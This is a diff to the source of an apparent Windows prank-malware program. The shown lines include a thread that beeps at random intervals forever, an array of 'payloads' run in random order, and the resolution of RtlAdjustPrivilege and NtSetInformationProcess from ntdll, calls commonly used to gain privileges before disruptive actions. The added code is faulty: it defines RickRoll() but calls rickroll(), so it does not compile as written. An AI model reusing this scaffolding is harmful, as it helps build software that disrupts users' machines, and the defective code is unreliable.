@@ -17,12 +17,18 @@ typedef NTSTATUS(NTAPI* fnNtSetInformationProcess)(HANDLE hProcess, ULONG ulClas
 
 typedef int (*functionarray) ();
 
+
+
 DWORD WINAPI audio(LPVOID lpParam) {
     while (true) {
         Sleep(rand() % 10000);
         Beep(rand() % 2000, rand() % 5000);
     }
     ExitThread(0);
+}
+
+void RickRoll() {
+
 }
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, INT nCmdShow) {
@@ -43,6 +49,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         p2,
         p3
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
+
+    rickroll();
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
     fnRtlAdjustPrivilege RtlAdjustPrivilege = (fnRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
